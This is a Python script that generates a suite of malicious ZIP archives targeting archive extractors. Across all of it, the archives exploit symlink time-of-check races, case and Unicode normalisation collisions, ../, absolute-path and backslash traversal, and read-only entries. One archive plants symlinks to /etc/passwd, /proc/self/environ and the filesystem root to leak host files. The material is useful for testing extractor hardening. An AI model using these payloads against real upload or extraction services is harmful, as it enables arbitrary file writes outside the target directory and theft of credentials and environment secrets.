import stat, unicodedata, zipfile

def sym(name):                       # a symlink entry
    zi = zipfile.ZipInfo(name); zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    return zi

def ro_unix(name):                   # a read-only (0444) Unix file entry
    zi = zipfile.ZipInfo(name); zi.create_system = 3
    zi.external_attr = (stat.S_IFREG | 0o444) << 16
    return zi

def ro_dos(name):                    # a read-only file via the DOS attribute
    zi = zipfile.ZipInfo(name); zi.create_system = 0   # FAT/DOS
    zi.external_attr = 0x01                             # FILE_ATTRIBUTE_READONLY
    return zi

# 1) cache-poisoning TOCTOU: validate d/sub, overwrite it with a symlink, write through it
with zipfile.ZipFile("toctou-slip.zip", "w") as z:
    z.writestr("d/sub/", b"")                  # dir (extractor validates/caches it)
    z.writestr(sym("d/sub"), "/tmp")           # same path -> symlink out
    z.writestr("d/sub/PWNED.txt", b"x")        # write through -> /tmp/PWNED.txt

# 2) case-insensitive collision (LINK vs link)
with zipfile.ZipFile("case-slip.zip", "w") as z:
    z.writestr(sym("LINK"), "/tmp")
    z.writestr("link/PWNED.txt", b"x")

# 3) Unicode NFC/NFD collision (café vs café)
with zipfile.ZipFile("unicode-slip.zip", "w") as z:
    z.writestr(sym(unicodedata.normalize("NFC", "café")), "/tmp")
    z.writestr(unicodedata.normalize("NFD", "café") + "/PWNED.txt", b"x")

# 4) Unicode NFKC compatibility collision (ﬁle vs file) — fools any extractor
#    that NFKC-normalizes names; note NFC==NFD here, so only NFKC triggers it
with zipfile.ZipFile("unicode-nfkc-slip.zip", "w") as z:
    z.writestr(sym("ﬁle"), "/tmp")            # "ﬁle" (U+FB01 fi ligature)
    z.writestr("file/PWNED.txt", b"x")             # "file" -> collides under NFKC

# --- read primitive: symlinks left in the output that point at host files ---

# 5) exfiltration: no collision, just symlinks that survive extraction. When the
#    output is later served/read, these leak arbitrary host files.
with zipfile.ZipFile("exfil-slip.zip", "w") as z:
    z.writestr(sym("passwd"), "/etc/passwd")
    z.writestr(sym("env"), "/proc/self/environ")
    z.writestr(sym("root"), "/")

# --- baseline write traversal (no symlink needed) ---

# 6) plain ../ path traversal
with zipfile.ZipFile("dotdot-slip.zip", "w") as z:
    z.writestr("../../../../../../tmp/PWNED.txt", b"x")

# 7) absolute path (extractor that doesn't strip a leading "/")
with zipfile.ZipFile("abs-slip.zip", "w") as z:
    z.writestr("/tmp/PWNED.txt", b"x")

# 8) Windows backslash traversal (sanitizer that only splits on "/")
with zipfile.ZipFile("backslash-slip.zip", "w") as z:
    z.writestr("..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt", b"x")

# --- permission annoyance: read-only files that resist deletion ---

# 9) read-only file. Extracted 0444 (Unix) or with the DOS read-only attribute:
#    `rm` prompts "remove write-protected file?" and needs -f; on Windows the
#    read-only attribute must be cleared (attrib -r) before delete. This is the
#    closest an archive can get to chattr +i — it is NOT kernel-enforced.
with zipfile.ZipFile("readonly-slip.zip", "w") as z:
    z.writestr(ro_unix("readonly-unix.txt"), b"can't rm me without -f\n")
    z.writestr(ro_dos("readonly-dos.txt"), b"clear the read-only attr first\n")
